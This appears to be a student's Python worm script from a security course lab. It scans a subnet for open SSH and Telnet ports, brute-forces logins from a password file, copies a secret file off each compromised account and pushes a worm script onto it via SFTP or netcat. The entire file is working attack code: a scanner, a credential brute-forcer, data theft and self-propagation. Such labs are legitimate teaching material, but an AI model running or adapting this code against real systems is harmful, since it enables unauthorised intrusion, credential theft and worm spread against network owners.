import paramiko
import telnetlib
import socket
import os

# Part 1: Find Vulnerable Machines

def is_port_open(ip, port):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(1)
            result = sock.connect_ex((ip, port))
            return result == 0
    except Exception as e:
        print(f"Error checking {ip}:{port} -> {e}")
        return False

def find_vulnerable_machines():
    ssh_ips = []
    telnet_ips = []

    subnet = "10.13.4."
    ssh_port = 22
    telnet_port = 23

    for i in range(256):
        ip = f"{subnet}{i}"
        if is_port_open(ip, ssh_port):
            ssh_ips.append(ip)
        if is_port_open(ip, telnet_port):
            telnet_ips.append(ip)

    # Write results to log files
    with open('open_ssh.log', 'w') as ssh_log:
        for ip in ssh_ips:
            ssh_log.write(f"{ip}\n")

    with open('open_telnet.log', 'w') as telnet_log:
        for ip in telnet_ips:
            telnet_log.write(f"{ip}\n")

# Part 2: Find Vulnerable Accounts

def load_credentials():
    with open("/home/cse/Lab2/Q2pwd", "r") as f:
        creds = [line.strip().split() for line in f.readlines()]
    return creds

def try_ssh_login(ip, username, password):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip, username=username, password=password, timeout=5)
        ssh.close()
        return True
    except paramiko.AuthenticationException:
        return False
    except Exception as e:
        print(f"SSH error on {ip}: {str(e)}")
        return False

def try_telnet_login(ip, username, password):
    try:
        telnet = telnetlib.Telnet(ip)
        telnet.read_until(b"login: ")
        telnet.write(username.encode('ascii') + b"\n")
        telnet.read_until(b"Password: ")
        telnet.write(password.encode('ascii') + b"\n")

        response = telnet.read_until(b"$", timeout=5)
        telnet.close()
        return b"$" in response
    except Exception as e:
        print(f"Telnet error on {ip}: {str(e)}")
        return False

def find_vulnerable_accounts():
    creds = load_credentials()

    ssh_ips = [line.strip() for line in open('open_ssh.log', 'r').readlines()]
    telnet_ips = [line.strip() for line in open('open_telnet.log', 'r').readlines()]

    with open('ssh_accounts.log', 'w') as ssh_log:
        for ip in ssh_ips:
            for username, password in creds:
                if try_ssh_login(ip, username, password):
                    print(f"SSH login successful on {ip} for {username}/{password}")
                    ssh_log.write(f"{ip},{username},{password}\n")
                    break

    with open('telnet_accounts.log', 'w') as telnet_log:
        for ip in telnet_ips:
            for username, password in creds:
                if try_telnet_login(ip, username, password):
                    print(f"Telnet login successful on {ip} for {username}/{password}")
                    telnet_log.write(f"{ip},{username},{password}\n")
                    break

# Part 3: Extract Secret and Infect with Worm

def extract_secret_ssh(ip, username, password):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip, username=username, password=password, timeout=5)

        sftp = ssh.open_sftp()
        remote_secret_path = f'/home/{username}/Q2secret'
        local_secret_path = '/home/cse/Lab2/Q2/extracted_secret'

        sftp.get(remote_secret_path, local_secret_path)

        with open(local_secret_path, 'r') as f:
            secret = f.read().strip()

        worm_path = '/home/cse/Lab2/Q2/Q2worm.py'
        sftp.put(worm_path, f'/home/{username}/Q2worm.py')

        sftp.close()
        ssh.close()

        return secret

    except Exception as e:
        print(f"SSH error on {ip}: {str(e)}")
        return None

def extract_secret_telnet(ip, username, password):
    try:
        telnet = telnetlib.Telnet(ip)
        telnet.read_until(b"login: ")
        telnet.write(username.encode('ascii') + b"\n")
        telnet.read_until(b"Password: ")
        telnet.write(password.encode('ascii') + b"\n")

        telnet.write(b"cat Q2secret\n")
        secret = telnet.read_until(b"$", timeout=5).decode('ascii').split('\n')[0]

        os.system(f"cat Q2worm.py | nc {ip} 1234")

        telnet.close()
        return secret

    except Exception as e:
        print(f"Telnet error on {ip}: {str(e)}")
        return None

def extract_and_infect():
    ssh_accounts = [line.strip().split(',') for line in open('ssh_accounts.log', 'r').readlines()]
    telnet_accounts = [line.strip().split(',') for line in open('telnet_accounts.log', 'r').readlines()]

    with open('extracted_secrets.log', 'w') as secrets_log:
        for ip, username, password in ssh_accounts:
            print(f"Extracting secret and infecting SSH account {username}@{ip}")
            secret = extract_secret_ssh(ip, username, password)
            if secret:
                secrets_log.write(f"{ip},{username},{secret}\n")

        for ip, username, password in telnet_accounts:
            print(f"Extracting secret and infecting Telnet account {username}@{ip}")
            secret = extract_secret_telnet(ip, username, password)
            if secret:
                secrets_log.write(f"{ip},{username},{secret}\n")

# Putting it all together

if __name__ == "__main__":
    print("Starting worm attack...")
    find_vulnerable_machines()  # Part 1
    find_vulnerable_accounts()  # Part 2
    extract_and_infect()        # Part 3
    print("Worm attack completed.")
